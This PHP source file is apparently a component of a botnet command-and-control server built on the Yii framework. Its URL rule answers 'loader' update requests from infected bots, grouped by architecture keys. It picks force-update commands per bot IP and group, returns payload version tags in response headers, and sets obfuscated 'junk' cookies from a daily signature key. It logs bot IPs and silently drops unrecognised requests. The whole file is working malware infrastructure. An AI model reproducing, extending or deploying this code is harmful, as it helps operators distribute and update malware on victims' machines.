<?php

namespace update\components;

use Yii;
use yii\web\UrlRuleInterface;
use yii\base\BaseObject;
use common\models\Bots;
use yii\web\HeaderCollection;
use common\models\Groups;
use common\models\Commands;
use backend\models\Sik;
use common\models\Proxylog;
use yii\db\Expression;
use yii\validators\IpValidator;

class BotUrlRule extends BaseObject implements UrlRuleInterface
{
    public function createUrl($manager, $route, $params)
    {
        return false; // this rule does not apply
    }

    public function parseRequest($manager, $request)
    {
        //if($request->isHead){ // update loader request
        // fix any actions
        $p = New Proxylog();
        $headers = Yii::$app->request->headers;
        $via = 'No proxy';
        $v = (isset($headers['via'])) ? $headers['via'] : 'No proxy';
        $vv = explode(' ', $v);
        if(isset($vv[1])){
            $vvv = explode(':',$vv[1]);
            if(isset($vvv[0])){
                $via = $vvv[0];
            }
        }
        //$p->ip = Yii::$app->request->userIP;
        $p->ip = $via;
        $p->created_at = new Expression('NOW()');

        //$p->save(false);

        if(isset($request->headers['update'])){
            $headers = $request->headers['update'];
            $realip = (isset($request->headers['realip'])) ? $request->headers['realip'] : '127.0.0.1';
            $h = '';
            $time = new \DateTime('NOW');
            $now = $time->format('Y-m-d'); // base format
            $timenow = $time->format('Y-m-d H:i:s'); // system time format
            $sig_date = '';
            $sig_key = '';

            $sig = Sik::find()->where('created_at = :created_at', [':created_at' => $now])->one();
            if($sig){
                $sig_date = $sig->date;
                $sig_key = $sig->key;
                //header("X-Tagg:  ".$sig->id."");
            }
            
            $m = Groups::findOne(['l86'=>$headers]);
            if($m){
                // is force update set?
                $c = Commands::find()->where(['commandtype'=>1001])->andWhere(['ip'=>$realip])->andWhere(['group'=>$m->group])->orderBy(['created_at' => SORT_DESC])->one();
                if(isset($c->created_at)){
                    if($c->created_at > $m->l86_created_at){
                        $h = explode(' ',$c->command)[2];  // force update newest
                    }else{
                        $h = $m->l86_version;
                    }
                }else{
                    $h = $m->l86_version;
                }
                $g = $m->group;
                $p->group = $m->group;
                header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
                header("X-Tag:  ".$h."");

                // cookie junk 
                if($sig){
                    $cooks = Groups::junkCookie($m->cookievalue,$sig->key);
                    foreach ($cooks as $key => $value) {
                        setcookie($key, $value);
                    }
                }
    
            }
            $m = Groups::findOne(['l64'=>$headers]);
            if($m){
                $c = Commands::find()->where(['commandtype'=>1002])->andWhere(['ip'=>$realip])->andWhere(['group'=>$m->group])->orderBy(['created_at' => SORT_DESC])->one();

                if(isset($c->created_at)){
                    if($c->created_at > $m->l64_created_at){
                        $h = explode(' ',$c->command)[2];  // force update newest
                    }else{
                        $h = $m->l64_version;
                    }
                }else{
                    $h = $m->l64_version;
                }
                $g = $m->group;
                $p->group = $m->group;
                header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
                header("X-Tag:  ".$h."");
                // cookie junk 
                if($sig){
                    $cooks = Groups::junkCookie($m->cookievalue,$sig->key);
                    foreach ($cooks as $key => $value) {
                        setcookie($key, $value);
                    }
                }
    
            }
            $m = Groups::findOne(['b86'=>$headers]);
            if($m){
                $c = Commands::find()->where(['commandtype'=>1003])->andWhere(['ip'=>$realip])->andWhere(['group'=>$m->group])->orderBy(['created_at' => SORT_DESC])->one();

                if(isset($c->created_at)){
                    if($c->created_at > $m->b86_created_at){
                        $h = explode(' ',$c->command)[2];  // force update newest
                    }else{
                        $h = $m->b86_version;
                    }
                }else{
                    $h = $m->b86_version;
                }
                $g = $m->group;
                $p->group = $m->group;
                header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
                header("X-Tag:  ".$h."");
                // cookie junk 
                if($sig){
                    $cooks = Groups::junkCookie($m->cookievalue,$sig->key);
                    foreach ($cooks as $key => $value) {
                        setcookie($key, $value);
                    }
                }
    
            }
            $m = Groups::findOne(['b64'=>$headers]);
            if($m){
                $c = Commands::find()->where(['commandtype'=>1004])->andWhere(['ip'=>$realip])->andWhere(['group'=>$m->group])->orderBy(['created_at' => SORT_DESC])->one();

                if(isset($c->created_at)){
                    if($c->created_at > $m->b64_created_at){
                        $h = explode(' ',$c->command)[2];  // force update newest
                    }else{
                        $h = $m->b64_version;
                    }
                }else{
                    $h = $m->b64_version;
                }
                $g = $m->group;
                $p->group = $m->group;
                header("Date:  ".$sig_date.' '.gmdate('H:i:s',strtotime($timenow))."");
                header("X-Tag:  ".$h."");
                // cookie junk 
                if($sig){
                    $cooks = Groups::junkCookie($m->cookievalue,$sig->key);
                    foreach ($cooks as $key => $value) {
                        setcookie($key, $value);
                    }
                }
    
            }
            if(isset($g)){
                $p->group = $g;
                Yii::info('Group '. $g . ' request for update from '.$realip, $category = 'loaderinfo');
            }else{
                Yii::info('Unrecognized loader request for update from '.$realip, $category = 'loaderinfo');
            }
            
        }

        $p->save(false);

        //}elseif($request->isGet){
        if($request->isGet || $request->isPost){
            $r = explode('/',Yii::$app->request->url);
            //if($r[1]=='api'){
                return ['site/update', []];
            //}
        }


        die(); // WTF??? But work!
        //throw new \yii\web\NotFoundHttpException('error 40403');
        
    }

    public function linkValidate($link)
    {

        $r = explode('/',$link);
        $comms = ['2','3','4','api']; // commands: 2 - request 3 - response 4 - message

        if(count($r) < 2){
            //throw new \yii\web\NotFoundHttpException('error 40400');
            die();
        }else{
            if(array_search(intval($r[1]), $comms)===false){
                //throw new \yii\web\NotFoundHttpException('error 40401');
                die();
            }
        }

        return true;
    }

    

    
}